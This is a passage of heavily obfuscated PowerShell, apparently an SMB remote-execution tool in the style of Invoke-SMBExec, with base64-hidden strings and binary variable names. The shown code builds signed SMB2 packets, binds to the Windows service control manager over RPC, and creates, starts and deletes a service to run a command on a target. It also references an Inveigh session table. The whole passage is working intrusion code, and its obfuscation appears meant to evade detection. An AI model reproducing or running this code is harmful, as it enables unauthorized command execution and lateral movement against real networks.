                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${00000010111100001} = _01110100101100000 ${10110011011000011} ${00011100101100110}
                            ${00111010111111011} = _01011001101010110 ${00000010111100001}
                            ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                            ${01010111111111000} = _01011001101010110 ${00101001010010001} 
                            ${01110101111101001} = _01001001100010110 ${01110001111010000} (${01010111111111000}.Length + ${00111010111111011}.Length)
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001} 
                            ${00110000011001000} = ${01111101001100100}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                        {
                            sleep -m $Sleep
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x08,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${01110101111101001} = _10100010011010000 ${01110001111010000}
                            ${01110101111101001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA')))] = 0xff,0x00,0x00,0x00
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001} 
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} 
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} 
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${01001010000110001} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${00101001010010001} = _10000010011110100 0x48,0x00 1 0x01 0x00,0x00 ${00111100100000110} 0x02,0x00
                            ${01010111111111000} = _01011001101010110 ${00101001010010001}
                            ${01110101111101001} = _01001001100010110 ${01110001111010000} ${01010111111111000}.Length
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001} 
                            ${00110000011001000} = ${01111101001100100}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        {
                            ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                            ${01110010010100001}.Flush()
                            ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                            if(_10100111110110000 ${00111000010101001}[12..15])
                            {
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                            }
                            else
                            {
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                            }
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                        {
                            if([System.BitConverter]::ToString(${00111000010101001}[132..135]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                            {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgACQAewAxADAAMQAxADAAMQAxADEAMAAwADEAMAAxADAAMQAxADEAfQAgAGMAcgBlAGEAdABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                                ${00001010011110110} = ${00111000010101001}[112..131]
                                ${01010010111101111} = ${10010010100101111}
                                ${00101000011001000}++
                                ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                                if(${00100000101110000})
                                {
                                    ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                                }
                                ${00000010111100001} = _01100100100100010 ${00001010011110110}
                                ${00111010111111011} = _01011001101010110 ${00000010111100001}
                                ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                                ${01010111111111000} = _01011001101010110 ${00101001010010001}
                                ${01110101111101001} = _01001001100010110 ${01110001111010000} (${01010111111111000}.Length + ${00111010111111011}.Length)
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                                ${01111101001100100} = _01011001101010110 ${01110101111101001}   
                                ${00110000011001000} = ${01111101001100100}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                                ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                                ${01001111000111011} = _01011001101010110 ${00011110010101001}
                                if(${00100000101110000})
                                {
                                    ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                                    ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                    ${00010010110010110} = ${00010010110010110}[0..15]
                                    ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                    ${10001010110110010} = _01011001101010110 ${00111111111000101}
                                }
                                ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAHQAbwAgAGUAeABlAGMAdQB0AGUAIABjAG8AbQBtAGEAbgBkACAAbwBuACAAJABUAGEAcgBnAGUAdAA=')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                            }
                            elseif([System.BitConverter]::ToString(${00111000010101001}[132..135]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwAxAC0AMAA0AC0AMAAwAC0AMAAwAA=='))))
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcgB2AGkAYwBlACAAJAB7ADEAMAAxADEAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMQB9ACAAYwByAGUAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcgB2AGkAYwBlACAAYwByAGUAYQB0AGkAbwBuACAAZgBhAHUAbAB0ACAAYwBvAG4AdABlAHgAdAAgAG0AaQBzAG0AYQB0AGMAaAA=')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                        {
                            ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                            if([System.BitConverter]::ToString(${00111000010101001}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
                            {
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                            }
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                        {
                            switch (${01010010111101111})
                            {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                                {
                                    if(${01011000010100111} -eq 2)
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                                    }
                                    else
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                    }
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                {
                                    ${01110001111010000} = ${00111000010101001}[132..147]
                                    if($Refresh -and ${10010010100101111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
                                    {
                                        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAGUAcwBzAGkAbwBuACAAcgBlAGYAcgBlAHMAaABlAGQA')))
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    elseif(${10010010100101111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                                    }
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                    ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ARgBpAHIAcwB0AA==')))
                                {
                                    if(${00101110100100010} -le 2)
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                                    }
                                    else
                                    {
                                        ${11000010110010100} = 2
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                                    }
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                                {
                                    if(${11000010110010100} -ge ${00101110100100010})
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                                    }
                                    else
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                                    }
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                    ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                    ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                                    ${01011000010100111} = 1
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgBXAA==')))
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                    ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAEEAYwBjAGUAcwBzAA=='))) 
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                {
                                    ${10010010100101111} = ${00011110011111011}
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                    ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgBXAA==')))
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                    ${00011110011111011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))  
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                {
                                    ${10110001011111111} = ${00111000010101001}[40..43]
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                {
                                    if(${10011100100001011} -and !$Logoff)
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                                    }
                                }
                            }
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                        {
                            ${10110001011111111} = ${00111000010101001}[40..43]
                            ${00101000011001000}++
                            ${01010010111101111} = ${10010010100101111}
                            ${00111111111000101} = _00110110101000101 0x03,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${01110101111101001} = _10100100100010100 ${10111110011101001}
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}    
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} 
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100}
                            try
                            {
                                ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                                ${01110010010100001}.Flush()
                                ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                                if(_10100111110110000 ${00111000010101001}[12..15])
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                                }
                                else
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                                }
                            }
                            catch
                            {
                                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcwBzAGkAbwBuACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAGkAcwAgAGMAbABvAHMAZQBkAA==')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x04,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${01110101111101001} = _10111001110100010
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                    }
                }
            }
            catch
            {
                echo "[-] $($_.Exception.Message)"
            }
        }
    }
    if(${10011100100001011} -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAbgA=')))
        $inveigh.session_message_ID_table[$session] = ${00101000011001000}
        $inveigh.session[$session] | ? {$_."Last Activity" = Get-Date -format s}
    }
    if(!${10011100100001011} -or $Logoff)
    {
        ${00001110111101110}.Close()
        ${01110010010100001}.Close()
    }
}
}
